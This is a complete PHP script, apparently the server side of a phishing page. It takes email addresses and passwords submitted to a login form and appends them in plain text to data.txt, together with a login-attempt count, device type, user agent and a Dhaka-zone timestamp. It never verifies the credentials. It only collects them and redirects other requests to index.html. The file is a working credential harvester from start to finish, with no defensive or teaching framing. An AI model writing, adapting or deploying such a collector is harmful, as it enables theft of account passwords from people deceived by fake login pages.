<?php
// --- Basic Click Counter (IN-MEMORY - WILL RESET ON SERVER RESTART) ---
session_start();
if (!isset($_SESSION['click_count'])) {
    $_SESSION['click_count'] = 0;
}
$_SESSION['click_count']++;
$click_number = $_SESSION['click_count'];
// ---------------------------------------------------------------------

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Collect data from the form submission
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $login_attempt = isset($_POST['login_attempt']) ? $_POST['login_attempt'] : 1;
    $device_type = isset($_POST['device_type']) ? $_POST['device_type'] : 'Unknown';

    // Get user agent
    $user_agent = $_SERVER['HTTP_USER_AGENT'];

    // Get timestamp (Asia/Dhaka timezone as per context)
    date_default_timezone_set('Asia/Dhaka');
    $timestamp = date("Y-m-d H:i:s");

    // Format the data to be stored
    $data = "Click Number: " . $click_number . "\n";
    $data .= "Login Attempt: " . $login_attempt . "\n";
    $data .= "Email: " . $email . "\n";
    $data .= "Password: " . $password . "\n";
    $data .= "Device Type: " . $device_type . "\n";
    $data .= "User Agent: " . $user_agent . "\n";
    $data .= "Timestamp: " . $timestamp . "\n";
    $data .= "------------------------\n";

    // Specify the path to the data.txt file
    $file = 'data.txt';

    // Open the file in append mode (to add data to the end)
    $handle = fopen($file, 'a');

    // Write the data to the file
    if ($handle) {
        fwrite($handle, $data);
        fclose($handle);
        echo "Data stored successfully.";
    } else {
        echo "Error: Could not write to the data file.";
    }

    exit();
} else {
    header("Location: index.html");
    exit();
}
?>
